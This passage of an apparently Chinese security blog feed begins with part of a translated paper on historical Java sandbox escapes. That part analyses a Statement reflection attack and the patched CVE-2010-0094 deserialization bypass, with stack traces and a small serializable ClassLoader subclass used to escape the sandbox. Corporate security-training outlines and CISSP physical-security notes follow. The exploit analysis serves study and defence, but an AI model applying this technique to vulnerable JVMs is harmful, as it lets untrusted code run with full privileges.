class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">at java.beans.Statement.invoke(Statement.java:<span class="number">235</span>)</span><br><span class="line">at java.beans.Expression.getValue(Expression.java:<span class="number">98</span>)</span><br><span class="line">at java.util.AbstractMap.toString(AbstractMap.java:<span class="number">487</span>)</span><br><span class="line">at javax.swing.DefaultListCellRenderer.getListCellRendererComponent</span><br><span class="line">(DefaultListCellRenderer.java:<span class="number">125</span>)</span><br><span class="line">at javax.swing.plaf.basic.BasicListUI.updateLayoutState</span><br><span class="line">(BasicListUI.java:<span class="number">1337</span>)</span><br><span class="line">at javax.swing.plaf.basic.BasicListUI.maybeUpdateLayoutState</span><br><span class="line">(BasicListUI.java:<span class="number">1287</span>)</span><br><span class="line">at javax.swing.plaf.basic.BasicListUI.paintImpl(BasicListUI.java:<span class="number">251</span>)</span><br><span class="line">at javax.swing.plaf.basic.BasicListUI.paint(BasicListUI.java:<span class="number">227</span>)</span><br><span class="line">at javax.swing.plaf.ComponentUI.update(ComponentUI.java:<span class="number">143</span>)</span><br><span class="line">at javax.swing.JComponent.paintComponent(JComponent.java:<span class="number">758</span>)</span><br><span class="line">at javax.swing.JComponent.paint(JComponent.java:<span class="number">1022</span>)</span><br><span class="line">at javax.swing.JComponent.paintChildren(JComponent.java:<span class="number">859</span>)</span><br><span class="line">at javax.swing.JComponent.paint(JComponent.java:<span class="number">1031</span>)</span><br><span class="line">at javax.swing.JComponent.paintChildren(JComponent.java:<span class="number">859</span>)</span><br><span class="line">at javax.swing.JComponent.paint(JComponent.java:<span class="number">1031</span>)</span><br><span class="line">at javax.swing.JLayeredPane.paint(JLayeredPane.java:<span class="number">564</span>)</span><br><span class="line">at javax.swing.JComponent.paintChildren(JComponent.java:<span class="number">859</span>)</span><br><span class="line">at javax.swing.JComponent.paint(JComponent.java:<span class="number">1031</span>)</span><br><span class="line">at javax.swing.JComponent.paintToOffscreen(JComponent.java:<span class="number">5104</span>)</span><br><span class="line">at javax.swing.BufferStrategyPaintManager.paint</span><br><span class="line">(BufferStrategyPaintManager.java:<span class="number">285</span>)</span><br><span class="line">at javax.swing.RepaintManager.paint(RepaintManager.java:<span class="number">1128</span>)</span><br><span class="line">at javax.swing.JComponent._paintImmediately(JComponent.java:<span class="number">5052</span>)</span><br><span class="line">at javax.swing.JComponent.paintImmediately(JComponent.java:<span class="number">4862</span>)</span><br><span class="line">at javax.swing.RepaintManager.paintDirtyRegions</span><br><span class="line">(RepaintManager.java:<span class="number">723</span>)</span><br><span class="line">at javax.swing.RepaintManager.paintDirtyRegions</span><br><span class="line">(RepaintManager.java:<span class="number">679</span>)</span><br><span class="line">at javax.swing.RepaintManager.seqPaintDirtyRegions</span><br><span class="line">(RepaintManager.java:<span class="number">659</span>)</span><br><span class="line">at javax.swing.SystemEventQueueUtilities$ComponentWorkRequest.run</span><br><span class="line">(SystemEventQueueUtilities.java:<span class="number">128</span>)</span><br><span class="line">at java.awt.event.InvocationEvent.dispatch(InvocationEvent.java:<span class="number">209</span>)</span><br><span class="line">at java.awt.EventQueue.dispatchEvent(EventQueue.java:<span class="number">597</span>)</span><br><span class="line">at java.awt.EventDispatchThread.pumpOneEventForFilters</span><br><span class="line">(EventDispatchThread.java:<span class="number">273</span>)</span><br><span class="line">at java.awt.EventDispatchThread.pumpEventsForFilter</span><br><span class="line">(EventDispatchThread.java:<span class="number">183</span>)</span><br><span class="line">at java.awt.EventDispatchThread.pumpEventsForHierarchy</span><br><span class="line">(EventDispatchThread.java:<span class="number">173</span>)</span><br><span class="line">at java.awt.EventDispatchThread.pumpEvents</span><br><span class="line">(EventDispatchThread.java:<span class="number">168</span>)</span><br><span class="line">at java.awt.EventDispatchThread.pumpEvents</span><br><span class="line">(EventDispatchThread.java:<span class="number">160</span>)</span><br><span class="line">at java.awt.EventDispatchThread.run(EventDispatchThread.java:<span class="number">121</span>)</span><br></pre></td></tr></table></figure><p>　　第一个观察是调用堆栈上没有不受信任的类。对调用堆栈的元素执行的任何安全检查都将通过。<br>　　如上面的调用堆栈所示，绘制操作（RepaintManager.java:1128）最终调用getListCellRendererComponent（）方法（DefaultListCellRenderer.java:125）。<em>JList</em>构造函数将item元素的列表作为参数。此方法依次调用项目上的toString（）方法。第一个元素是<em>Map</em>，在其所有项目上调用getValue（）。getValue（）方法调用Statement.invoke（），它通过反射调用分析师的目标方法。</p><h5 id="4-3-3-讨论"><a href="#4-3-3-讨论" class="headerlink" title="4.3.3 讨论"></a>4.3.3 讨论</h5><p>　　通过修改Statement.invoke（）方法来修补此漏洞，以在创建<em>Statement</em>的代码的<em>AccessControlContext</em>中执行反射调用。此漏洞不适用于最新版本的JRE，因为创建<em>Statement</em>的不受信任的代码没有任何权限。</p><h4 id="4-4-序列化"><a href="#4-4-序列化" class="headerlink" title="4.4 序列化"></a>4.4 序列化</h4><h5 id="4-4-1-背景"><a href="#4-4-1-背景" class="headerlink" title="4.4.1 背景"></a>4.4.1 背景</h5><p>　　Java允许在运行时将对象转换为字节流，这对于持久性和网络通信非常有用。将对象转换为字节序列称为串行，并且将字节流转换为对象的相反过程称为反序列化。在特权上下文中完成反序列化过程的一部分可能会发生。分析人员可以通过实例化由于缺少权限而通常不允许实例化的对象来利用这一点。一个典型的例子是类<em>java.lang.ClassLoader</em>。分析人员（总是在没有权限的情况下）不能直接实例化<em>ClassLoader</em>的子类_S_，因为<em>ClassLoader</em>的构造函数检查调用者是否具有CREATE_CLASSLOADER权限。但是，如果他找到了在特权上下文中反序列化_S_的序列化版本的方法，他可能最终会得到_S_的实例。请注意，_S_的序列化版本可以由攻击范围之外的分析人员创建（例如，在他自己的机器上，没有沙箱的JVM）。在攻击期间，序列化版本只是表示_S_实例的数据。在本节中，我们将展示如何利用CVE-2010-0094来使用系统代码，该系统代码对特权上下文中分析师提供的数据进行反序列化。这可用于执行任意代码，从而绕过所有沙箱限制。</p><h5 id="4-4-2-示例：CVE-2010-0094"><a href="#4-4-2-示例：CVE-2010-0094" class="headerlink" title="4.4.2 示例：CVE-2010-0094"></a>4.4.2 示例：CVE-2010-0094</h5><p>　　漏洞CVE-2010-0094位于方法RMIConnectionImpl.createMBean（String，ObjectName，ObjectName，MarshalledObject，String[]，Subject）中。<em>MarshalledObject</em>类型的第四个参数包含对象_S_的字节表示，该对象在特权上下文中进行反序列化（在具有所有权限的doPrivileged（）调用内）。分析人员可以传递任意对象来创建用于反序列化的MBean（）。在我们的例子中，他传递了<em>java.lang.ClassLoader</em>的子类：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">S</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>　　在易受攻击的JVM版本（例如1.6.0_17）中，实例化对象_S_时的调用堆栈如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span>: Thread [main] (Suspended (breakpoint at line <span class="number">226</span> in ClassLoader))</span><br><span class="line"> <span class="number">2</span>: S(ClassLoader).&lt;init&gt;() line: <span class="number">226</span> [local variables</span><br><span class="line">    unavailable]</span><br><span class="line"> <span class="number">4</span>: GeneratedSerializationConstructorAccessor1.newInstance(Object[])</span><br><span class="line">    line: not available</span><br><span class="line"> <span class="number">6</span>: Constructor&lt;T&gt;.newInstance(Object...) line: <span class="number">513</span></span><br><span class="line"> <span class="number">7</span>: ObjectStreamClass.newInstance() line: <span class="number">924</span></span><br><span class="line"> <span class="number">8</span>: MarshalledObject$MarshalledObjectInputStream</span><br><span class="line">    (ObjectInputStream).readOrdinaryObject(<span class="keyword">boolean</span>) line: <span class="number">1737</span></span><br><span class="line"><span class="number">10</span>: MarshalledObject$MarshalledObjectInputStream</span><br><span class="line">    (ObjectInputStream).readObject0(<span class="keyword">boolean</span>) line: <span class="number">1329</span></span><br><span class="line"><span class="number">12</span>: MarshalledObject$MarshalledObjectInputStream</span><br><span class="line">    (ObjectInputStream).readObject() line: <span class="number">351</span></span><br><span class="line"><span class="number">14</span>: MarshalledObject&lt;T&gt;.get() line: <span class="number">142</span></span><br><span class="line"><span class="number">15</span>: RMIConnectionImpl$<span class="number">6</span>.run() line: <span class="number">1513</span></span><br><span class="line"><span class="number">16</span>: AccessController.doPrivileged(PrivilegedExceptionAction&lt;T&gt;)</span><br><span class="line">    line: not available [<span class="keyword">native</span> method]</span><br><span class="line"><span class="number">18</span>: RMIConnectionImpl.unwrap(MarshalledObject, ClassLoader,</span><br><span class="line">    Class&lt;T&gt;) line: <span class="number">1505</span></span><br><span class="line"><span class="number">20</span>: RMIConnectionImpl.access$<span class="number">500</span>(MarshalledObject, ClassLoader,</span><br><span class="line">    Class) line: <span class="number">72</span></span><br><span class="line"><span class="number">22</span>: RMIConnectionImpl$<span class="number">7</span>.run() line: <span class="number">1548</span></span><br><span class="line"><span class="number">23</span>: AccessController.doPrivileged(PrivilegedExceptionAction&lt;T&gt;)</span><br><span class="line">    line: not available [<span class="keyword">native</span> method]</span><br><span class="line"><span class="number">25</span>: RMIConnectionImpl.unwrap(MarshalledObject, ClassLoader,</span><br><span class="line">    ClassLoader, Class&lt;T&gt;) line: <span class="number">1544</span></span><br><span class="line"><span class="number">27</span>: RMIConnectionImpl.createMBean(String, ObjectName, ObjectName,</span><br><span class="line">    MarshalledObject, String[], Subject) line: <span class="number">376</span></span><br><span class="line"><span class="number">29</span>: Exploit.exploit() line: <span class="number">79</span></span><br><span class="line"><span class="number">30</span>: Exploit(BypassExploit).run_exploit() line: <span class="number">24</span></span><br><span class="line"><span class="number">31</span>: ExploitBase.run(ExploitBase) line: <span class="number">20</span></span><br><span class="line"><span class="number">32</span>: Exploit.main(String[]) line: <span class="number">19</span></span><br></pre></td></tr></table></figure><p>　　我们观察到反序列化发生在特权上下文中（在第16行和第23行的doPrivileged（）内）。请注意，它是<em>ClassLoader</em>类（<init>（），可信代码）的构造函数，它位于堆栈上，而不是_S_（分析器类，不可信代码）的构造函数。请注意，在第2行“S（ClassLoader）”表示<em>ClassLoader</em>在堆栈上，而不是_S_。如果_S_已经在堆栈上，<em>ClassLoader</em>构造函数中的权限检查会抛出安全异常，因为不受信任的代码（因此没有权限）在堆栈上。为什么_S_不在调用堆栈上？答案由序列化协议的文档给出。它表示被调用的构造函数是没有实现<em>Serializable</em>接口的类层次结构的第一个构造函数。在我们的示例中，_S_实现<em>Serializable</em>，因此不会调用其构造函数。_S_扩展<em>ClassLoader</em>，它不实现<em>Serializable</em>。因此，反序列化系统代码调用<em>ClassLoader</em>的空构造函数。因此，堆栈跟踪仅在特权上下文中包含堆栈上的受信任系统类（在doPrivileged（）之后可能存在不受信任的代码，因为在检查调用堆栈时，权限检查将在doPrivileged（）方法处停止）。<em>ClassLoader</em>中的权限检查将成功。<br>　　但是，稍后在系统代码中，_S_的这个实例被强制转换为_S_的类型，而不是<em>ClassLoader</em>。那么，分析师如何检索这个实例呢？一种解决方案是向_S_添加静态字段以及向_S_类添加方法以在静态字段中保存_S_实例的引用：</init></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">S</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> S myCL = <span class="keyword">null</span>;</span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream in)</span></span></span><br><span class="line"><span class="function">  <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line"> S.myCL = <span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>　　readObject（）方法是在反序列化期间调用的特殊方法（通过上面调用堆栈中第8行的readOrdinaryObject（））。此时没有进行权限检查，因此不受信任的代码（S.readObject（）方法）可以在调用堆栈上。<br>　　分析师现在可以访问_S_的实例。由于_S_是<em>ClassLoader</em>的子类，因此分析人员可以定义具有所有权限的新类并禁用安全管理器（类似于3.1.1节中的方法）。此时，沙箱被禁用，分析师可以执行任意代码。<br>　　此漏洞影响14个Java 1.6版本（从版本1.6.0_01到1.6.0_18）。它已在版本1.6.0_24中得到纠正。<br>　　以下“功能”的组合使分析师能够绕过沙箱：（1）可信代码允许对不可信代码控制的数据进行反序列化，（2）在特权上下文中进行反序列化，以及（3）通过以下方式创建对象：反序列化的方法遵循与常规对象实例化不同的过程。<br>　　漏洞CVE-2010-0094已在Java 1.6.0更新24中得到修复。对doPrivileged（）的两次调用已从代码中删除。在修补版本中，当初始化<em>ClassLoader</em>时，权限检查失败，因为现在检查整个调用堆栈（请参阅下面的新调用堆栈）。第21行及以下的不受信任的代码没有CREATE_CLASSLOADER权限。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span>: Thread [main] (Suspended (breakpoint at line <span class="number">226</span> in ClassLoader))</span><br><span class="line"> <span class="number">2</span>: MyClassLoader(ClassLoader).&lt;init&gt;() line: <span class="number">226</span> [local variables</span><br><span class="line">    unavailable]</span><br><span class="line"> <span class="number">4</span>: GeneratedSerializationConstructorAccessor1.newInstance(Object[])</span><br><span class="line">    line: not available</span><br><span class="line"> <span class="number">6</span>: Constructor&lt;T&gt;.newInstance(Object...) line: <span class="number">513</span></span><br><span class="line"> <span class="number">7</span>: ObjectStreamClass.newInstance() line: <span class="number">924</span></span><br><span class="line"> <span class="number">8</span>: MarshalledObject$MarshalledObjectInputStream</span><br><span class="line">    (ObjectInputStream).readOrdinaryObject(<span class="keyword">boolean</span>) line: <span class="number">1736</span></span><br><span class="line"><span class="number">10</span>: MarshalledObject$MarshalledObjectInputStream(ObjectInputStream)</span><br><span class="line">    .readObject0(<span class="keyword">boolean</span>) line: <span class="number">1328</span></span><br><span class="line"><span class="number">12</span>: MarshalledObject$MarshalledObjectInputStream(ObjectInputStream)</span><br><span class="line">    .readObject() line: <span class="number">350</span></span><br><span class="line"><span class="number">14</span>: MarshalledObject&lt;T&gt;.get() line: <span class="number">142</span></span><br><span class="line"><span class="number">15</span>: RMIConnectionImpl.unwrap(MarshalledObject, ClassLoader,</span><br><span class="line">    Class&lt;T&gt;) line: <span class="number">1523</span></span><br><span class="line"><span class="number">17</span>: RMIConnectionImpl.unwrap(MarshalledObject, ClassLoader,</span><br><span class="line">    ClassLoader, Class&lt;T&gt;) line: <span class="number">1559</span></span><br><span class="line"><span class="number">19</span>: RMIConnectionImpl.createMBean(String, ObjectName, ObjectName,</span><br><span class="line">    MarshalledObject, String[], Subject) line: <span class="number">376</span></span><br><span class="line"><span class="number">21</span>: Exploit.exploit() line: <span class="number">79</span></span><br><span class="line"><span class="number">22</span>: Exploit(BypassExploit).run_exploit() line: <span class="number">24</span></span><br><span class="line"><span class="number">23</span>: ExploitBase.run(ExploitBase) line: <span class="number">20</span></span><br><span class="line"><span class="number">24</span>: Exploit.main(String[]) line: <span class="number">19</span></span><br></pre></td></tr></table></figure><h5 id="4-4-3-讨论"><a href="#4-4-3-讨论" class="headerlink" title="4.4.3 讨论"></a>4.4.3 讨论</h5><p>　　此漏洞表明序列化协议的特性（仅调用特定构造函数）可以与易受攻击的系统代码一起利用，该代码在特权上下文中对分析师控制的数据进行反序列化，以绕过沙箱并运行任意代码。由于序列化协议由于向后兼容性原因而无法轻松修改，因此已修补易受攻击的代码。</p><h3 id="5-结论"><a href="#5-结论" class="headerlink" title="5 结论"></a>5 结论</h3><p>　　在本文中，我们专注于Java平台的复杂安全模型，该模型已经被攻击了大约20年。我们展示了该平台包含本机组件（如Java虚拟机），以及大量Java系统类（JCL），并且对系统的两个部分进行了广泛的不同攻击。这包括低级攻击，例如内存损坏漏洞，以及对策略实施的Java级攻击，例如可信方法链攻击。这突出了保护平台实际使用的任务是多么困难。<br>　　我们将本文作为案例研究进行了介绍，以说明诸如Java平台之类的复杂系统如何安全地包含潜在恶意代码的执行。希望这篇对过去Java漏洞利用的概述提供了有助于我们在未来设计更强大系统的见解。</p>]]></content>
    
    <summary type="html">
    
      二十年来各种关键的安全漏洞完全绕过了sandbox，影响了Java平台的每个主要版本。
    
    </summary>
    
      <category term="Security" scheme="https://www.diyz.bid/categories/Security/"/>
    
    
      <category term="Java沙箱逃逸" scheme="https://www.diyz.bid/tags/Java%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
    
  </entry>
  
  <entry>
    <title>安全培训大纲</title>
    <link href="https://www.diyz.bid/Security/%E5%AE%89%E5%85%A8%E5%9F%B9%E8%AE%AD%E5%A4%A7%E7%BA%B2/"/>
    <id>https://www.diyz.bid/Security/安全培训大纲/</id>
    <published>2018-09-29T08:14:58.000Z</published>
    <updated>2018-10-11T10:12:52.891Z</updated>
    
    <content type="html"><![CDATA[<h3 id="安全培训大纲"><a href="#安全培训大纲" class="headerlink" title="安全培训大纲"></a>安全培训大纲</h3><ul><li><p>邮件安全</p><ul><li>钓鱼邮件</li><li>邮件伪造</li><li>第三方转存</li><li>检查发件人</li><li>开启二次验证</li><li>邮件转发</li><li>第三方代收</li><li>邮件附件敏感信息加密</li></ul></li><li><p>病毒防范</p><ul><li>什么是木马病毒</li><li>我安装哪些杀毒软件？</li><li>定期更新病毒库</li></ul></li><li><p>浏览器安全</p><ul><li>不浏览恶意网站</li><li>不从恶意网站下载软件</li><li>下载软件从官网下载</li></ul></li><li><p>信息泄露</p><ul><li>敏感数据上传到云笔记、GitHub</li><li>共享账号</li><li>使用公司邮箱注册外部账号或者私人账号</li><li>社交网络发布公司技术解决方案&amp;保密产品信息</li><li>公司账号和私人账号要隔离</li><li>打印后及时取走</li></ul></li><li><p>个人电脑安全</p><ul><li>锁屏幕</li><li>不轻易插入陌生U盘</li><li>及时的系统更新</li><li>不从外部下载破解软件(有需要请找IT同学)</li><li>不将公司数据带离工作场所</li><li>电脑要加开机密码，防止电脑丢失后造成数据泄露</li><li>企业微信、微信、QQ、QQ群文件发送文件要打包加密</li><li>工作文档加密盘（利用如TrueCrypt的之类的加密软件）</li></ul></li><li><p>密码泄露</p><ul><li>根据调查显示目前全世界泄露账号密码以及个人隐私有800亿条</li><li>密码使用超过12位以上使用特殊字符、大小写字母和数字</li><li>密码不要与公司内部密码有关联</li><li>密码三个月要更换一次</li></ul></li><li><p>WiFi安全</p><ul><li>不连接不可信WiFi</li><li>连接不可信WiFi后需要连接VPN</li><li>不要在工作区私自桥接，共享办公网WIFI</li><li>不要使用WIFI万能钥匙等共享密码的APP</li></ul></li><li><p>VPN以及OA安全</p><ul><li>VPN账号和OA账号仅自己持有</li><li>任何人不会和你以任何理由要VPN以及OA账号</li><li>VPN的动态验证短信不转发给其他人</li></ul></li><li><p>客服注意事项</p><ul><li>我在和谁聊天</li><li>确定对方身份的流程</li><li>我可以提供哪些信息</li><li>敏感操作回拨验证人员身份</li></ul></li><li><p>物理安全</p><ul><li>门禁</li><li>碎纸机（防止泄露商业信息）</li><li>视频监控</li><li>禁止人员尾随进入工作区</li></ul></li></ul><h3 id="WEB安全开发"><a href="#WEB安全开发" class="headerlink" title="WEB安全开发"></a>WEB安全开发</h3><ul><li>XSS跨站漏洞</li><li>SQL注入</li><li>跨站请求伪造漏洞</li><li>支付逻辑漏洞</li><li>越权漏洞</li><li>平行权限</li><li>验证码逻辑漏洞</li><li>API未限速漏洞</li><li>GitHub敏感信息泄露</li><li>法律风险意识</li></ul><h3 id="APP安全开发"><a href="#APP安全开发" class="headerlink" title="APP安全开发"></a>APP安全开发</h3><ul><li>数据安全<ul><li>存储</li><li>传输</li><li>使用</li><li>验证</li></ul></li><li>代码安全<ul><li>逆向</li><li>调试</li><li>重新打包</li></ul></li><li>环境特性<ul><li>系统</li><li>组件</li><li>权限</li><li>端口</li></ul></li><li>业务安全<ul><li>逻辑漏洞</li><li>策略</li><li>合规</li></ul></li></ul><h3 id="安全运维"><a href="#安全运维" class="headerlink" title="安全运维"></a>安全运维</h3><ul><li><p>服务器安全</p><ul><li>MFA登录</li><li>使用key登录</li><li>禁止弱密码登录</li><li>禁用无用账号</li><li>账号锁定策略（防止暴力破解，ssh:fail2ban）</li><li>检查特殊账号（空口令）</li><li>禁止root远程登录</li><li>关闭非必须服务器服务</li><li>安装IDS/IPS系统</li><li>进行日志收集</li></ul></li><li><p>更新</p><ul><li>系统版本要尽量贴近官方版本</li><li>软件版本（例如：php）要及时升级</li></ul></li><li><p>日志</p><ul><li>收集全面</li><li>实时传输</li><li>重点日志例如 ssh 内核日志 业务日志</li><li>业务日志要脱敏</li></ul></li><li><p>软件安装</p><ul><li>只允许可信软件源</li><li>需要新软件需要经过安全评估</li><li>业务代码尽量不使用root权限运行</li></ul></li><li><p>网络安全</p><ul><li>ACL限制不需要互相访问的业务通讯</li><li>安全组不要附加</li><li>snmp修改团体名称</li></ul></li><li><p>数据安全</p><ul><li>杜绝弱口令</li><li>禁止匿名用户</li><li>数据库加密（按照最小化权限原则）</li><li><strong>Redis必须加密</strong></li><li>大数据服务必须有鉴权</li><li>MongoDB必须加密码</li></ul></li><li><p>流程安全控制</p><ul><li>运维准入</li><li>域名开通流程</li><li>VPN申请流程</li><li>跳板机申请流程</li></ul></li></ul><ul><li>物理安全<ul><li>机房服务器不允许使用USB接口</li><li>VGA显示器应该处于退出状态</li></ul></li></ul><h3 id="产品经理安全培训"><a href="#产品经理安全培训" class="headerlink" title="产品经理安全培训"></a>产品经理安全培训</h3><ul><li>敏感信息泄露</li><li>调试开关</li><li>防重签名</li><li>http-dns</li><li>数据包劫持</li><li>登录机制安全性</li><li>防暴力破解</li><li>时间窗口合理性</li><li>不要成为短信轰炸机</li><li>任意用户密码重置</li></ul>]]></content>
    
    <summary type="html">
    
      本文列出了安全培训所涉及的各个方面。
    
    </summary>
    
      <category term="Security" scheme="https://www.diyz.bid/categories/Security/"/>
    
    
      <category term="安全文档" scheme="https://www.diyz.bid/tags/%E5%AE%89%E5%85%A8%E6%96%87%E6%A1%A3/"/>
    
      <category term="SDL" scheme="https://www.diyz.bid/tags/SDL/"/>
    
      <category term="安全培训" scheme="https://www.diyz.bid/tags/%E5%AE%89%E5%85%A8%E5%9F%B9%E8%AE%AD/"/>
    
  </entry>
  
  <entry>
    <title>cissp学习笔记（10）——物理安全需求</title>
    <link href="https://www.diyz.bid/notes/cissp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%8810%EF%BC%89%E2%80%94%E2%80%94%E7%89%A9%E7%90%86%E5%AE%89%E5%85%A8%E9%9C%80%E6%B1%82/"/>
    <id>https://www.diyz.bid/notes/cissp学习笔记（10）——物理安全需求/</id>
    <published>2018-09-25T06:11:39.000Z</published>
    <updated>2018-10-11T10:12:52.875Z</updated>
    
    <content type="html"><![CDATA[<p>在本章的考试大纲内容有：<br>3) 安全工程(安全的工程学和管理)</p><ul><li>J. 应用安全原则到场所和设施设计中</li><li><p>K. 设计和应用物理安全</p><ul><li>K.1 配线柜</li><li>K.2 服务器机房</li><li>K.3 介质存储设施</li><li>K.4 证据存储</li><li>K.5 受限和工作区域安全(例如，运营中心)</li><li>K.6 数据中心安全</li><li>K.7 基础设施和HVAC注意事项</li><li>K.8 水的问题(例如，漏水和水灾)</li><li>K.9 火灾预防、检测和抑制<br>7) 安全运营(例如，基本概念、调查、实践管理、灾难恢复)</li></ul></li><li><p>O. 应用和管理物理安全</p><ul><li>O.1 周边(例如，访问控制和监控)</li><li>O.2 内部安全(例如，陪同要求/访问控制、钥匙和锁)</li></ul></li></ul><h3 id="10-1-应用安全原则到选址和设施设计"><a href="#10-1-应用安全原则到选址和设施设计" class="headerlink" title="10.1 应用安全原则到选址和设施设计"></a>10.1 应用安全原则到选址和设施设计</h3><h4 id="10-1-1-安全设施计划"><a href="#10-1-1-安全设施计划" class="headerlink" title="10.1.1 安全设施计划"></a>10.1.1 安全设施计划</h4><p>　　安全设施计划描述了组织的安全要求的轮廓，并且着重强调为了提供安全性所用的方法和机制。关键路径分析是一种系统工作，可以确定关键任务应用、过程和操作以及所有必要的支持要素之间的关系。当正确执行关键路径分析时，支撑组织的必要的相互依赖和相互作用就会形成。一旦分析完成，那么结果将作为一列安全条目提供服务。在检查关键路径时，己完成的评估或潜在的技术融合是很重要的。技术融合是不同的技术、解决方案、工具和系统在随着时间的推移进行发展和合井的趋势。安保人员应参与场所和设施的设计考虑。否则，对于现存的逻辑安全，在许多物理安全方面的内容可能会被忽略。</p><h4 id="10-1-2-场所选择"><a href="#10-1-2-场所选择" class="headerlink" title="10.1.2 场所选择"></a>10.1.2 场所选择</h4><p>　　场所的选择应该以组织的安全需要为基础。成本、地点和大小都很重要，但是解决安全要求始终应当放在首位。在整个场所选择过程中，场所的位置和构造起到了至关重要的作用。毗邻其他建筑物和业务是另一个至关重要的考虑因素。至少要确保建筑物的设计要求能够应对极端的天气，并且能够阻拦或防御明显的非法闯入企图。容易受到攻击的进入位置(例女日，窗户和门)往往就是此类分析。此外，还应当评估非法闯入容易借助的遮挡视线的物体(例如，树木、灌木或人为因素) 。</p><h4 id="10-1-3-可视性"><a href="#10-1-3-可视性" class="headerlink" title="10.1.3 可视性"></a>10.1.3 可视性</h4><p>　　可视性是十分重要的。必须对周围地形、周围区域的组成、紧急事件服务机构、潜在危险等进行分析。</p><h4 id="10-1-4-自然灾害"><a href="#10-1-4-自然灾害" class="headerlink" title="10.1.4 自然灾害"></a>10.1.4 自然灾害</h4><p>　　必须准备应付自然灾害，并且使町环境经受得住灾害事件的影响，或者可以容易地进行替换。</p><h4 id="10-1-5-设施的设计"><a href="#10-1-5-设施的设计" class="headerlink" title="10.1.5 设施的设计"></a>10.1.5 设施的设计</h4><p>　　在进行设施的设计时，需要理解组织所需的安全等级。在设计开始之前，必须计划并设计恰当的安全等级。”安全架构”经常被称为环境设计预防犯罪(Crime Prevention Through Environmental Design，CPTED)。指导思想是通过结构化的物理环境和周围环境，在潜在的罪犯做出任何犯罪行为之前影响其个人决定。</p><h3 id="10-2-设计和实施物理安全"><a href="#10-2-设计和实施物理安全" class="headerlink" title="10.2 设计和实施物理安全"></a>10.2 设计和实施物理安全</h3><p>　　用于对物理安全进行管理的安全控制可以分为三组： 行政性的、技术性的和物理性的。由于它们都用于描述访问控制的相同类别，因此记住这些分组的物理安全特性是十分重要的。为具体环境设计物理安全性时，需要牢记控制措施的功能顺序：</p><ul><li>阻拦</li><li>拒绝</li><li>检测</li><li>延缓</li></ul><h4 id="10-2-1-设备故障"><a href="#10-2-1-设备故障" class="headerlink" title="10.2.1 设备故障"></a>10.2.1 设备故障</h4><p>　　系统返回到完整的正常功能状态的响应时间与这种解决方案所涉及的维护成本成正比。成本包括存储、运输、预先购买以及维护现场安装和恢复专业技术。在某些情况中，维护现场替换是不可行的。对于这种情况，与硬件供应商签订服务级别协议(SLA)是十分必要的。SLA 清楚地定义了供应商在发生设备故障的紧急情况下所提供的响应时间。对老化的硬件进行替换和/或修理应该制定时间表。这些操作的时间表应该以为每种设备估计的平均无故障时间(Mean Time To Failure，MTTF)和平均修复时间(Mean Time To Repair，MTTR)为基础。设备送外修复时，需要在修复期间使用替代的解决方案或备份设备。通常，在出现小故障时进行修理是可以接受的，但是等到出现大故障时再进行更换，就是一种无法接受的安全实践。</p><h4 id="10-2-2-配线间"><a href="#10-2-2-配线间" class="headerlink" title="10.2.2 配线间"></a>10.2.2 配线间</h4><p>　　